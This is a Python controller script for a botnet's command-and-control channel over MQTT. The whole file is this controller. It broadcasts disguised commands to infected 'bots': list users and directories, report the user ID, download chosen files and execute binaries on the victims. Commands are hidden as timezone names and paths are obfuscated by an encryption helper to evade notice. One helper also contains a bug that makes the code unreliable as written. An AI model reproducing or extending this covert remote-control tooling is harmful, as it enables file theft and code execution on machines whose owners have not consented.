from paho.mqtt import client as mqtt
from datetime import datetime
from zoneinfo import ZoneInfo
from common import *
import threading
import random
import json
import time

response_lock = threading.Lock()
bot_responses = []

def on_connect(client, userdata, flags, rc):
    # rc - connection result code. 0 - success, otherwise failure.
    if rc == 0:
        print("Connected to MQTT Broker.")
        print(f"Subscribing to topic: {MQTT_TOPIC}.")
        client.subscribe(MQTT_TOPIC)
    else:
        print(f"Failed to connect, connection return code {rc}.")
        client.disconnect()
        exit(1)


def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        data = decode_response(payload)

        with response_lock:
            bot_responses.append(data)

    except Exception as ex:
        print(f"Failed to handle message: {ex}")


def decode_response(payload: str):
    try:
        data = json.loads(payload)
        result = {}
        message = ""
        bot_id = ""

        if MSG_FIELD_BOT_ID in data:
            # this field means bot id
            bot_id = data[MSG_FIELD_BOT_ID]

        if MSG_FIELD_ENCRYPTED_MSG in data:
            # if field present, it contains encrypted message
            encrypted_msg = data[MSG_FIELD_ENCRYPTED_MSG]
            decrypted_msg = do_very_strange_decryption(encrypted_msg)
            message += f"{decrypted_msg}"

        elif MSG_FIELD_TIMEZONES in data:
            # if field present, every timezone in list is mapped to character A-Z
            message += decode_as_timezones(data[MSG_FIELD_TIMEZONES])

        result["bot_id"] = bot_id
        result["message"] = message
        return result
    except Exception:
        raise Exception("Invalid payload.")


def timezone_date_time(timezone: str):
    now_utc = datetime.now(timezone.utc)
    try:
        return now_utc.astimezone(ZoneInfo(timezone))
    except Exception:
        # ignore error, return anything
        return now_utc


def publish_action_call(client: mqtt.Client, action_number: int, path: str = None):
    if action_number not in COMMAND_TO_TIMEZONE:
        print(f"Timezone is missing for action number {action_number}")
        raise Exception(f"Timezone is missing for action number {action_number}")

    action_as_timezone = COMMAND_TO_TIMEZONE[action_number]
    dt = timezone_date_time(action_as_timezone)
    
    msg = {
        MSG_FIELD_ACTION: action_as_timezone,
        "datetime": dt.isoformat()
    }

    if path is not None:
        msg[MSG_FIELD_ENCRYPTED_MSG] = do_very_strange_encryption(path)

    with response_lock:
        bot_responses.clear()

    client.publish(MQTT_TOPIC, json.dumps(msg))


def wait_for_responses(timeout=5):
    print(f"Waiting {timeout} seconds for bot responses...")
    time.sleep(timeout)
    with response_lock:
        print(f"\nBot responses ({len(bot_responses)}):")
        for response in bot_responses:
            print(f"\t- {response["bot_id"]}: {response["message"]}")


def user_actions(client: mqtt.Client):
    retry = True
    while retry:
        try:
            retry = False
            print("Actions:")
            print(f'\t[{CMD_LIST_BOTS}] List alive bots.')
            print(f'\t[{CMD_LIST_USERS}] List logged in users.')
            print(f'\t[{CMD_LIST_DIR}] List content of specified directory.')
            print(f'\t[{CMD_GET_USER_ID}] Print ID of user running the bot.')
            print(f'\t[{CMD_DOWNLOAD_FILE}] Download specified file.')
            print(f'\t[{CMD_EXECUTE_BINARY}] Execute a binary.')
            print("\t[Q] Quit.")

            action = input("Select action: ").strip()

            path = None
            if action in [str(CMD_LIST_DIR), str(CMD_DOWNLOAD_FILE), str(CMD_EXECUTE_BINARY)]:
                path = input("Enter path: ").strip()
                if not path:
                    print("Path cannot be empty.")
                    retry = True
                    continue

            if action in COMMAND_TO_TIMEZONE:
                publish_action_call(client, int(action), path)
                wait_for_responses()
            elif action.upper() == "Q":
                print("Quitting...")
                retry = False
            else:
                print("Invalid action selected.")
                retry = True

        except KeyboardInterrupt:
            print("Quitting...")
            retry = False
        except Exception as ex:
            print(f"An error occurred during action selection: {ex}")
            retry = True


def main():
    # create MQTT client
    client_id = f"Controller{random.randint(1, 10000)}"
    client = mqtt.Client(client_id)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_start()
        user_actions(client)
    except Exception as ex:
        print(f"An error occurred: {ex}")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()
